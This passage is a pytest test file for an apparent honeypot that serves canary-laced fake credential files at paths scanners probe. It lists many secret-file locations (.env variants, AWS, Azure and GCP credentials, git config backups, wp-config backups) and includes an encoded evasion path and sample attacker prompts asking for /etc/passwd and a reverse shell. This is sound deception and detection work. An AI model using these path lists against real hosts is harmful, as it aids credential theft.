    "/k8s/secrets.yml",
    "/k8s/secret.yaml",
    "/k8s/deployment.yaml",
    "/k8s/deployment.yml",
])
def test_new_canary_trap_paths_dispatch(path):
    assert path.lower() in tbenv._TRAP_BY_PATH, (
        f"{path!r} should be a CanaryTrap entry"
    )


@pytest.mark.parametrize("path", [
    # Regression: scanner-walkable variants on the gcp-credentials-json
    # family must NOT collide with the existing config-json trap that
    # claims bare `/credentials.json`. The new alias prefixes are only
    # `/api/`, `/private/`, `/backend/`, `/app/`, `/config/` — bare
    # `/credentials.json` stays with config-json.
    "/credentials.json",
])
def test_bare_credentials_json_routes_to_config_json(path):
    trap = tbenv._TRAP_BY_PATH[path.lower()]
    assert trap.name == "config-json", (
        f"{path!r} must remain on config-json, not gcp-credentials-json"
    )


@pytest.mark.parametrize("path", [
    # Webroot-prefix `.env*` cross-product additions. These were previously
    # silently captured by the tarpit (any leaf starting with `.env` hit
    # `is_tarpit_path`), which dripped junk bytes but never embedded the
    # canary the scanner was grepping for. Each entry below must dispatch
    # to the env-production trap so a scanner-dictionary walk lands on a
    # canary on first match.
    # Representative app-framework prefixes
    "/wp/.env", "/wordpress/.env", "/laravel/.env", "/symfony/.env",
    "/magento/.env", "/drupal/.env", "/joomla/.env", "/prestashop/.env",
    "/yii/.env", "/zend/.env", "/cakephp/.env", "/codeigniter/.env",
    # Reverse-proxy webroot conventions
    "/www/.env", "/web/.env", "/public/.env", "/public_html/.env",
    "/html/.env", "/site/.env", "/htdocs/.env",
    # Env tiers
    "/dev/.env", "/development/.env", "/prod/.env", "/production/.env",
    "/staging/.env", "/stage/.env", "/qa/.env", "/test/.env",
    "/uat/.env", "/preprod" if False else "/preview/.env",  # 'preprod' covered as a suffix on dev
    # Source/build tree
    "/src/.env", "/core/.env", "/build/.env", "/dist/.env",
    "/vendor/.env", "/lib/.env",
    # API + frontend frameworks
    "/api/.env", "/v1/.env", "/v2/.env", "/v3/.env", "/rest/.env",
    "/graphql/.env", "/next/.env", "/nuxt/.env", "/vue/.env",
    "/react/.env", "/angular/.env", "/svelte/.env", "/vite/.env",
    # Cloud / CI / orchestration
    "/aws/.env", "/azure/.env", "/gcp/.env", "/docker/.env",
    "/k8s/.env", "/kubernetes/.env", "/terraform/.env", "/ansible/.env",
    "/jenkins/.env", "/circleci/.env", "/github/.env", "/gitlab/.env",
    # DB sidecars
    "/mysql/.env", "/postgres/.env", "/mongodb/.env", "/redis/.env",
    "/elasticsearch/.env", "/rabbitmq/.env", "/kafka/.env",
    "/database/.env",
    # Admin/dashboard surfaces
    "/admin/.env", "/admin-panel/.env", "/administrator/.env",
    "/dashboard/.env", "/panel/.env", "/portal/.env", "/cms/.env",
    "/crm/.env", "/erp/.env", "/saas/.env", "/control-panel/.env",
    "/user-panel/.env", "/shop/.env", "/store/.env", "/shopify/.env",
    # Deep prefixes
    "/var/www/.env", "/var/www/html/.env", "/srv/.env",
    # Same prefix, common suffix variants — confirms the cross-product
    # covers both axes, not just the bare `.env`.
    "/wp/.env.production", "/wp/.env.local", "/wp/.env.bak",
    "/wp/.env.dev", "/wp/.env.staging", "/wp/.env.backup",
    "/wp/.env.remote", "/wp/.env_copy", "/wp/.env.swp", "/wp/.env~",
    "/wp/.env.yaml", "/wp/.env.yml", "/wp/.env.json", "/wp/.env.dist",
    "/wp/.env.uat", "/wp/.env.sample", "/wp/.env.preprod",
    "/wp/.env.stage", "/wp/.env1", "/wp/.env2",
    "/laravel/.env.production", "/laravel/.env.local",
    "/laravel/.env.bak", "/laravel/.env.backup",
    "/api/.env.production", "/api/.env.local", "/api/.env.bak",
    "/api/.env.staging", "/api/.env.dev",
    # Bare-dotfile suffix coverage gaps the original list missed
    "/.env.bak", "/.env.backup", "/.env.backup1", "/.env.backup2",
    "/.env.remote", "/.env.sample", "/.env.stage", "/.env.uat",
    "/.env.preprod", "/.env.swp", "/.env~", "/.env.dist",
    "/.env.yaml", "/.env.yml", "/.env.json", "/.env.txt",
    "/.env1", "/.env_copy",
    # Sloppy-commit `env.*` (no leading dot) variants
    "/env.old", "/env.save", "/env.backup",
])
def test_env_prefix_paths_dispatch_to_env_production(path):
    trap = tbenv._TRAP_BY_PATH.get(path.lower())
    assert trap is not None and trap.name == "env-production", (
        f"{path!r} should dispatch to env-production, got {trap and trap.name!r}"
    )


def test_env_prefix_paths_do_not_clobber_mail_service_env():
    # Mail-service prefixes (sendgrid/postmark/mailjet/brevo/mailgun/
    # mailing/mail/mailserver) must stay routed to the dedicated
    # mail-service-env trap — not silently overwritten by the env-prefix
    # cross-product. Regression for the trap-table ordering invariant.
    for prefix in ("sendgrid", "postmark", "mailjet", "brevo", "mailgun",
                   "mailing", "mail", "mailserver"):
        trap = tbenv._TRAP_BY_PATH.get(f"/{prefix}/.env")
        assert trap is not None and trap.name == "mail-service-env", (
            f"/{prefix}/.env should be mail-service-env, got {trap and trap.name!r}"
        )


def test_env_prefix_paths_skip_bare_dot_env():
    # Bare `/.env` is owned by the dedicated `_send_env` handler upstream
    # of canary-trap dispatch — the env-production trap must not claim it
    # or the dispatch order breaks.
    assert "/.env" not in tbenv._TRAP_BY_PATH


def test_env_production_paths_unique():
    # The generator should dedupe — defensive against future overlap
    # between bare-dotfile, prefix, and `env.*` loops.
    paths = tbenv._env_production_paths()
    assert len(paths) == len(set(paths)), "env-production paths should be unique"


@pytest.mark.parametrize("path", [
    # Bare-webroot no-leading-dot env variants
    "/env.production", "/env.prod", "/env.live", "/env.local", "/env.dev",
    "/env.staging", "/env.php", "/env.example", "/env.sample",
    # `<prefix>/env<suffix>` — no leading dot cross-product
    "/storage/env", "/storage/env.production", "/storage/env.php",
    "/storage/env.txt", "/storage/env.local", "/storage/env.staging",
    "/app/env", "/app/env.production", "/app/env.php", "/app/env.dev",
    "/backend/env.production", "/api/env.php", "/config/env",
    # `<prefix>/<name>.env` — credential-tier bare-name env dictionaries
    "/secret.env", "/keys.env", "/prod.env", "/dev.env", "/staging.env",
    "/backup.env", "/credentials.env",
    "/storage/secret.env", "/storage/keys.env", "/storage/prod.env",
    "/storage/dev.env", "/storage/staging.env", "/storage/backup.env",
    "/app/secret.env", "/app/keys.env", "/app/prod.env",
    "/app/dev.env", "/app/staging.env",
    # Deep-bare-env variants — `<prefix>/<subdir>/env`
    "/storage/config/env", "/storage/api/env", "/storage/backup/env",
    "/app/config/env", "/app/api/env", "/app/backup/env",
    "/api/env", "/backup/env",
])
def test_env_no_dot_and_leaf_env_dispatch_to_env_production(path):
    trap = tbenv._TRAP_BY_PATH.get(path.lower())
    assert trap is not None and trap.name == "env-production", (
        f"{path!r} should dispatch to env-production, got {trap and trap.name!r}"
    )


def test_env_production_does_not_claim_bare_env():
    # Bare `/env` is the Spring Boot Actuator endpoint, owned by
    # `actuator-env`. env-production's no-leading-dot Group 5 must skip
    # the empty-suffix variant or actuator-env is silently shadowed.
    trap = tbenv._TRAP_BY_PATH.get("/env")
    assert trap is not None and trap.name == "actuator-env", (
        f"/env should stay routed to actuator-env, got {trap and trap.name!r}"
    )


@pytest.mark.parametrize("path,expected_trap", [
    # AWS credentials-file — app-layout prefixed variants
    ("/storage/.aws/credentials", "aws-credentials-file"),
    ("/app/.aws/credentials", "aws-credentials-file"),
    ("/backend/.aws/credentials", "aws-credentials-file"),
    ("/public/.aws/credentials", "aws-credentials-file"),
    ("/www/.aws/credentials", "aws-credentials-file"),
    ("/htdocs/.aws/credentials", "aws-credentials-file"),
    # AWS config-file
    ("/storage/.aws/config", "aws-config-file"),
    ("/app/.aws/config", "aws-config-file"),
    # s3cfg / passwd-s3fs
    ("/storage/.s3cfg", "s3cfg"),
    ("/app/.s3cfg", "s3cfg"),
    ("/storage/.passwd-s3fs", "passwd-s3fs"),
    # netrc / _netrc
    ("/storage/.netrc", "netrc"),
    ("/storage/_netrc", "netrc"),
    ("/app/.netrc", "netrc"),
    ("/app/_netrc", "netrc"),
    # git-credentials
    ("/storage/.git-credentials", "git-credentials"),
    ("/app/.git-credentials", "git-credentials"),
    # gcp-credentials-json — no-extension bare-dotdir + app-layout
    ("/.gcp/credentials", "gcp-credentials-json"),
    ("/root/.gcp/credentials", "gcp-credentials-json"),
    ("/storage/.gcp/credentials", "gcp-credentials-json"),
    ("/app/.gcp/credentials", "gcp-credentials-json"),
    ("/storage/.gcp/credentials.json", "gcp-credentials-json"),
    ("/app/.gcp/credentials.json", "gcp-credentials-json"),
    # azure-credentials-file — non-canonical dotdir credential file
    ("/.azure/credentials", "azure-credentials-file"),
    ("/root/.azure/credentials", "azure-credentials-file"),
    ("/storage/.azure/credentials", "azure-credentials-file"),
    ("/app/.azure/credentials", "azure-credentials-file"),
    ("/backend/.azure/credentials", "azure-credentials-file"),
])
def test_app_layout_credential_prefix_variants(path, expected_trap):
    trap = tbenv._TRAP_BY_PATH.get(path.lower())
    assert trap is not None and trap.name == expected_trap, (
        f"{path!r} should dispatch to {expected_trap}, got {trap and trap.name!r}"
    )


def test_azure_credentials_ini_shape_and_canary():
    # Render the azure-credentials-file trap directly and confirm the
    # embedded AWS canary secret lands in the client_secret slot
    # (byte-grep harvesters looking for AWS secret-access-key bytes
    # pick up the alert regardless of the surrounding field label).
    trap = tbenv._TRAP_BY_PATH["/.azure/credentials"]
    body = trap.render(FAKE_TRACEBIT)
    assert b"[default]" in body
    assert b"tenant_id" in body
    assert b"client_id" in body
    assert b"client_secret = " in body
    aws_secret = FAKE_TRACEBIT["aws"]["awsSecretAccessKey"].encode("ascii")
    assert aws_secret in body


def test_azure_credentials_ini_per_hit_uniqueness():
    # Every rendered response must produce a fresh tenant_id / client_id /
    # subscription_id triple — otherwise the entire fleet ships one
    # identity and every canary'd IP looks like the same tenant.
    trap = tbenv._TRAP_BY_PATH["/.azure/credentials"]
    a = trap.render(FAKE_TRACEBIT)
    b = trap.render(FAKE_TRACEBIT)
    # Extract the UUID after "tenant_id = "
    def _extract(field, blob):
        line = next(l for l in blob.decode().splitlines() if l.startswith(field + " "))
        return line.split("= ", 1)[1]
    for field in ("tenant_id", "client_id", "subscription_id"):
        assert _extract(field, a) != _extract(field, b), (
            f"{field} must be per-hit unique"
        )


@pytest.mark.parametrize("path", [
    "/.git/config.bak", "/.git/config.old", "/.git/config.local",
    "/.git/config.orig", "/.git/config.orig.bak", "/.git/config.bak.bak",
    "/.git/config.save", "/.git/config.swp", "/.git/config~",
    "/.git/config.personal", "/.git/config.work", "/.git/config.user",
    "/.git/credentials.bak", "/.git/credentials.old",
    "/.git/credentials.local", "/.git/credentials~",
])
def test_fake_git_config_and_credentials_aliases_populated(path):
    # These aliases exist so scanner dictionaries walking .bak/.old/
    # .local/~ variants of `/.git/config` and `/.git/credentials` land
    # on a canary'd response instead of a fake-git-miss 404.
    files, _meta = tbenv._build_fake_repo("db_password: hunter2\n", FAKE_TRACEBIT)
    assert path in files, f"{path} should be aliased in the fake-git tree"
    if path.startswith("/.git/config"):
        assert files[path] == files["/.git/config"], (
            f"{path} should mirror /.git/config exactly"
        )
    else:
        assert files[path] == files["/.git/credentials"], (
            f"{path} should mirror /.git/credentials exactly"
        )


@pytest.mark.asyncio
async def test_get_or_issue_canary_coalesces_concurrent_requests(monkeypatch):
    """Concurrent requests for the same (IP, types) tuple must share one
    upstream issuance — without single-flight, a burst of N parallel hits
    from one scanner trips the canary API rate limit and most responses
    come back as 502 errors.
    """
    monkeypatch.setattr(tbenv, "_CANARY_CACHE", {})
    monkeypatch.setattr(tbenv, "_CANARY_INFLIGHT", {})
    monkeypatch.setattr(tbenv, "_CANARY_LOCK", None)

    issue_calls = 0

    async def _slow_issue(*a, **kw):
        nonlocal issue_calls
        issue_calls += 1
        await asyncio.sleep(0.05)
        return {"aws": {"awsAccessKeyId": f"AKIAFAKE{issue_calls:04d}"}}

    monkeypatch.setattr(tbenv, "issue_credentials", _slow_issue)

    results = await asyncio.gather(*[
        tbenv._get_or_issue_canary(
            ("aws",), "10.0.0.1", f"req-{i}", "host", "ua", "/p", "https",
        )
        for i in range(20)
    ])
    # Exactly one upstream call, regardless of fan-out.
    assert issue_calls == 1, f"expected 1 issue, got {issue_calls}"
    # Every concurrent waiter got the same canary back.
    assert all(r == results[0] for r in results)
    assert results[0] is not None


@pytest.mark.asyncio
async def test_get_or_issue_canary_clears_inflight_on_error(monkeypatch):
    """A failed issuance must clear `_CANARY_INFLIGHT` so the next request
    re-tries rather than hanging forever on a stale future.
    """
    monkeypatch.setattr(tbenv, "_CANARY_CACHE", {})
    monkeypatch.setattr(tbenv, "_CANARY_INFLIGHT", {})
    monkeypatch.setattr(tbenv, "_CANARY_LOCK", None)

    call_n = 0

    async def _flaky_issue(*a, **kw):
        nonlocal call_n
        call_n += 1
        if call_n == 1:
            raise aiohttp.ClientError("simulated rate limit")
        return {"aws": {"awsAccessKeyId": "AKIAFAKERECOVER"}}

    monkeypatch.setattr(tbenv, "issue_credentials", _flaky_issue)

    first = await tbenv._get_or_issue_canary(
        ("aws",), "10.0.0.2", "req-1", "host", "ua", "/p", "https",
    )
    assert first is None
    assert not tbenv._CANARY_INFLIGHT, (
        "in-flight future should be cleared after failure"
    )

    # Second request, fresh, should succeed and populate the cache.
    second = await tbenv._get_or_issue_canary(
        ("aws",), "10.0.0.2", "req-2", "host", "ua", "/p", "https",
    )
    assert second is not None
    assert second["aws"]["awsAccessKeyId"] == "AKIAFAKERECOVER"


@pytest.mark.asyncio
async def test_fake_git_get_or_build_coalesces_concurrent_requests(monkeypatch):
    """Same single-flight contract as `_get_or_issue_canary` — a burst of
    `<prefix>/.git/config` probes from one scanner IP must collapse to one
    upstream issuance, not N parallel 502s.
    """
    monkeypatch.setattr(tbenv, "_FAKE_GIT_CACHE", {})
    monkeypatch.setattr(tbenv, "_FAKE_GIT_INFLIGHT", {})
    monkeypatch.setattr(tbenv, "_FAKE_GIT_LOCK", None)

    issue_calls = 0

    async def _slow_issue(*a, **kw):
        nonlocal issue_calls
        issue_calls += 1
        await asyncio.sleep(0.05)
        return {
            "aws": {
                "awsAccessKeyId": f"AKIAFAKE{issue_calls:04d}",
                "awsSecretAccessKey": "fakeSecret",
                "awsSessionToken": "fakeToken",
            },
        }

    monkeypatch.setattr(tbenv, "issue_credentials", _slow_issue)

    results = await asyncio.gather(*[
        tbenv._fake_git_get_or_build(
            "10.0.0.3", f"req-{i}", "host", "ua", "/.git/config", "https",
        )
        for i in range(10)
    ])
    assert issue_calls == 1, f"expected 1 issue, got {issue_calls}"
    # All callers see the same files dict (object identity, since they
    # share the in-flight Future's result).
    first_files, first_meta = results[0]
    for files, meta in results[1:]:
        assert files is first_files
        assert meta is first_meta


def test_default_canary_types_includes_gitlab_username_password():
    # /.env bare handler uses CANARY_TYPES when the caller doesn't pass an
    # explicit list. Default should request both aws (fires globally via
    # STS) and gitlab-username-password (fires against the Tracebit-hosted
    # gitlab URL, which format_env_payload emits alongside the creds).
    # Previously default was just ["aws"], which is why the canary dashboard
    # showed ~99% AWS even though the other types cost nothing extra to request.
    import importlib
    module = importlib.reload(tbenv)
    try:
        assert "aws" in module.CANARY_TYPES
        assert "gitlab-username-password" in module.CANARY_TYPES
    finally:
        importlib.reload(tbenv)


def test_find_canary_trap_returns_none_when_disabled(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", False)
    assert tbenv.find_canary_trap("/.aws/credentials") is None


def test_find_canary_trap_matches_case_insensitively(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    assert tbenv.find_canary_trap("/WP-Config.PHP") is not None
    assert tbenv.find_canary_trap("/.AWS/Credentials") is not None


def test_find_canary_trap_misses_non_trap_paths(monkeypatch):
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    for p in ["/", "/index.html", "/api/v4/projects", "/.env"]:
        assert tbenv.find_canary_trap(p) is None, f"unexpected match for {p}"


def test_every_trap_has_distinct_paths():
    """Catch accidental duplicates across traps (which one wins would be undefined)."""
    seen: dict[str, str] = {}
    for trap in tbenv.CANARY_TRAPS:
        for p in trap.paths:
            lp = p.lower()
            assert lp not in seen, f"{lp} claimed by both {seen[lp]} and {trap.name}"
            seen[lp] = trap.name


def test_gitlab_cookie_emits_set_cookie_header():
    """The gitlab-sign-in trap returns the gitlab-cookie canary as Set-Cookie,
    not in the body. That's how the scanner picks it up."""
    trap = tbenv._TRAP_BY_PATH["/users/sign_in"]
    headers = trap.extra_headers(FAKE_TRACEBIT)
    assert headers, "expected at least one extra header"
    names = {h[0] for h in headers}
    assert "Set-Cookie" in names
    cookie_value = next(v for k, v in headers if k == "Set-Cookie")
    assert "cookieCanaryValue" in cookie_value


async def _fake_canary(*args, **kwargs):
    return FAKE_TRACEBIT


async def test_dispatch_routes_aws_credentials_file_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.aws/credentials",
        headers={"X-Forwarded-For": "203.0.113.10"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "aws-credentials-file"


@pytest.mark.parametrize("path,expected_result", [
    ("/credentials.csv", "aws-credentials-csv"),
    ("/new_user_credentials.csv", "aws-credentials-csv"),
    ("/admin/credentials.csv", "aws-credentials-csv"),
    # Case-scrambling is the high-intent scanner shape per the Console
    # download — `_TRAP_BY_PATH` lookups are case-folded.
    ("/Credentials.CSV", "aws-credentials-csv"),
    ("/accessKeys.csv", "aws-access-keys-csv"),
    ("/rootkey.csv", "aws-access-keys-csv"),
    ("/ACCESS_KEYS.CSV", "aws-access-keys-csv"),
])
async def test_dispatch_routes_aws_credentials_csv_to_trap(
    flux_client, monkeypatch, path, expected_result,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.11"})
    assert resp.status == 200
    assert resp.headers["Content-Type"] == "text/csv; charset=utf-8"
    body = await resp.read()
    # Real AWS Console downloads use CRLF line endings.
    assert body.count(b"\r\n") >= 2
    assert b"AKIAFAKEEXAMPLE01" in body
    assert b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == expected_result
    assert "aws" in entries[-1]["canaryTypes"]


def test_aws_credentials_csv_account_id_is_per_hit_unique():
    # Account ID embedded in the Console-login URL must rotate per hit so
    # the rendered body isn't a fleet-wide fingerprint. (Username and the
    # AKIA bytes are also per-hit, but the account ID is the one that
    # would otherwise default to a single fixed literal.)
    bodies = {tbenv.render_aws_credentials_csv(FAKE_TRACEBIT) for _ in range(8)}
    assert len(bodies) >= 4, "account-id and password should rotate per render"


def test_aws_credentials_csv_has_no_fixed_credential_literal():
    # Synthetic password must change between renders — a fixed literal
    # would turn the trap into a fleet-wide fingerprint string.
    passwords = set()
    for _ in range(8):
        body = tbenv.render_aws_credentials_csv(FAKE_TRACEBIT).decode("utf-8")
        # Row 2: `iam-deploy-bot,<password>,AKIA...`
        data_row = body.splitlines()[1]
        passwords.add(data_row.split(",")[1])
    assert len(passwords) >= 4, "password column must be per-hit synthetic"


@pytest.mark.parametrize("path", [
    "/.terraform/terraform.tfstate",
    "/terraform.tfstate",
    "/terraform.tfstate.backup",
])
async def test_dispatch_routes_terraform_tfstate_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.14"})
    assert resp.status == 200
    assert resp.headers["Content-Type"] == "application/json; charset=utf-8"
    body = await resp.read()
    parsed = json.loads(body)
    assert parsed["version"] == 4
    assert parsed["resources"][0]["type"] == "aws_iam_access_key"
    attrs = parsed["resources"][0]["instances"][0]["attributes"]
    assert attrs["id"] == "AKIAFAKEEXAMPLE01"
    assert attrs["secret"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert parsed["outputs"]["deploy_access_key_id"]["value"] == "AKIAFAKEEXAMPLE01"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "terraform-tfstate"


def test_terraform_tfstate_lineage_and_serial_per_hit_unique():
    """Lineage uuid + serial vary per render so the rendered body can't be
    cross-sensor fingerprinted."""
    a = json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))
    b = json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))
    assert a["lineage"] != b["lineage"]
    # serial is a small int so a tie is possible but improbable; sample a few
    serials = {json.loads(tbenv.render_terraform_tfstate(FAKE_TRACEBIT))["serial"] for _ in range(8)}
    assert len(serials) > 1, "serial should vary across renders"


async def test_handle_swallows_body_read_disconnect():
    """A scanner that sends Content-Length and drops the socket before the body
    arrives makes `request.content.read()` raise ConnectionResetError. Without
    a handler this becomes a 30-line stack trace per hit. handle() should
    return a 499 Response and not let the exception propagate."""
    class _Stream:
        async def read(self, n):
            raise ConnectionResetError("Connection lost")

    class _Request:
        method = "POST"
        headers = {"Host": "x", "User-Agent": "u"}
        content = _Stream()
        rel_url = type("U", (), {"raw_path": "/x", "raw_query_string": ""})()

    resp = await tbenv.handle(_Request())
    assert resp.status == 499


@pytest.mark.parametrize("path", [
    "/wp-config.php.old",
    "/wp-config.php.save",
    "/wp-config.php.txt",
    "/wp-config.php.swp",
    "/wp-config.php~",
    "/wp-config.php::$DATA",
    "/wp-config-backup.php",
    "/backup/wp-config.php",
    "/%2577%2570%252D%2563%256F%256E%2566%2569%2567.%2570%2568%2570.%2562%2561%256B",
    # Leading-dot vim/emacs swap+backup naming — real vim writes
    # `.filename.swp` in the same directory as the file being edited.
    "/.wp-config.php.swp",
    "/.wp-config.php.swo",
    "/.wp-config.php.swn",
    "/.wp-config.php~",
    # Sample / distribution templates left in the webroot.
    "/wp-config-sample.php",
    "/wp-config.php.dist",
    "/wp-config.php.default",
    "/wp-config.php.inc",
])
async def test_dispatch_routes_wp_config_backup_variants_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.12"})
    assert resp.status == 200
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "wp-config"


async def test_dispatch_trap_404s_without_api_key(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)

    for path in ["/.aws/credentials", "/wp-config.php", "/id_rsa", "/api/v4/user"]:
        resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.11"})
        assert resp.status == 404, f"expected 404 for {path} sans API_KEY"


async def test_dispatch_trap_serves_on_any_host(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    for host in ["staging.victim.example", "example.com", "127.0.0.1"]:
        resp = await flux_client.get(
            "/wp-config.php",
            headers={"X-Forwarded-Host": host, "X-Forwarded-For": "203.0.113.13"},
        )
        assert resp.status == 200, f"trap should fire for Host={host!r}"
        body = await resp.read()
        assert b"AWS_ACCESS_KEY_ID" in body


async def test_dispatch_openai_config_embeds_aws_canary(flux_client, monkeypatch):
    """Scanner hitting /.openai/config.json gets a JSON doc whose api_key is
    the AWS canary value. Field names are OpenAI-flavored; the value is
    AWS-flavored. This is the intentional mismatch documented at the top
    of the AI-credential renderers."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.openai/config.json",
        headers={"X-Forwarded-For": "203.0.113.40"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["api_key"] == "AKIAFAKEEXAMPLE01"
    assert body["default_model"].startswith("gpt-")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "openai-config"


async def test_dispatch_anthropic_config_embeds_aws_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.anthropic/config.json",
        headers={"X-Forwarded-For": "203.0.113.41"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["auth_token"] == "AKIAFAKEEXAMPLE01"
    assert body["default_model"].startswith("claude-")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "anthropic-config"


async def test_dispatch_cursor_mcp_embeds_canary_in_env_blocks(flux_client, monkeypatch):
    """The Cursor MCP config shape is nested — canary lives inside
    mcpServers[*].env. Scanners that flatten for secret-looking values
    still pick it up."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.cursor/mcp.json",
        headers={"X-Forwarded-For": "203.0.113.42"},
    )
    assert resp.status == 200
    body = await resp.json()
    servers = body["mcpServers"]
    assert servers["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"] == "AKIAFAKEEXAMPLE01"
    assert servers["internal-tools"]["env"]["API_KEY"]
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cursor-mcp"


async def test_dispatch_gitlab_sign_in_emits_set_cookie(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/users/sign_in",
        headers={"X-Forwarded-For": "203.0.113.14"},
    )
    assert resp.status == 200
    set_cookies = resp.headers.getall("Set-Cookie", [])
    assert any("cookieCanaryValue" in v for v in set_cookies), set_cookies


def test_is_fingerprint_path_case_insensitive(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", True)
    assert tbenv.is_fingerprint_path("/Index.HTML")


def test_is_fingerprint_path_non_match(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", True)
    for path in ["/wp-login.php", "/api/v1/users", "/readme", "/.env"]:
        assert not tbenv.is_fingerprint_path(path)


# --- Fake LLM-API endpoint trap ---
#
# Covers the path set scanner fleets were observed probing in April 2026
# across Ollama-native, OpenAI-compatible, and corporate AI-proxy shapes.


def test_llm_endpoint_enabled_by_default():
    """The trap is cheap, logs are cheap — default-on like webshell."""
    assert tbenv.LLM_ENDPOINT_ENABLED


def test_llm_endpoint_default_paths_cover_observed_probes():
    """Every path observed hitting our sensors in the April 2026
    AI-endpoint-probe window must match."""
    observed = [
        "/v1/models",              # generic OpenAI + Ollama-compatible list
        "/anthropic/v1/models",    # corporate AI-proxy target
        "/api/version",            # Ollama-specific
        "/api/tags",               # Ollama-specific
        "/api/chat",               # Ollama chat
        "/api/generate",           # Ollama completion
        "/v1/chat/completions",    # OpenAI chat
        "/v1/messages",            # Anthropic direct
        "/anthropic/v1/messages",  # Anthropic proxy
    ]
    for path in observed:
        assert tbenv.is_llm_endpoint_path(path), f"expected match: {path}"


def test_llm_endpoint_path_case_insensitive():
    assert tbenv.is_llm_endpoint_path("/V1/MODELS")
    assert tbenv.is_llm_endpoint_path("/Anthropic/V1/Models")


def test_llm_endpoint_path_non_match():
    for path in ["/", "/v1/files", "/api/foo", "/v2/models", "/.env"]:
        assert not tbenv.is_llm_endpoint_path(path)


def test_llm_endpoint_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_ENDPOINT_ENABLED", False)
    assert not tbenv.is_llm_endpoint_path("/v1/models")


def test_extract_llm_prompt_openai_chat_shape():
    body = b'{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hello world"}]}'
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "gpt-4o-mini"
    assert action == "chat"
    assert "user: hello world" in prompt


def test_extract_llm_prompt_anthropic_block_shape():
    """Anthropic sends content as a list of typed blocks, not a bare string."""
    body = (
        b'{"model":"claude-3-5-sonnet-20241022","messages":'
        b'[{"role":"user","content":[{"type":"text","text":"read /etc/passwd"}]}]}'
    )
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "claude-3-5-sonnet-20241022"
    assert action == "chat"
    assert "read /etc/passwd" in prompt


def test_extract_llm_prompt_ollama_generate_shape():
    body = b'{"model":"llama3.2:latest","prompt":"write me a reverse shell"}'
    model, prompt, action, _ = tbenv.extract_llm_prompt(body, "application/json")
    assert model == "llama3.2:latest"
    assert action == "completion"
    assert "reverse shell" in prompt


def test_extract_llm_prompt_empty_body():
    model, prompt, action, _ = tbenv.extract_llm_prompt(b"", "application/json")
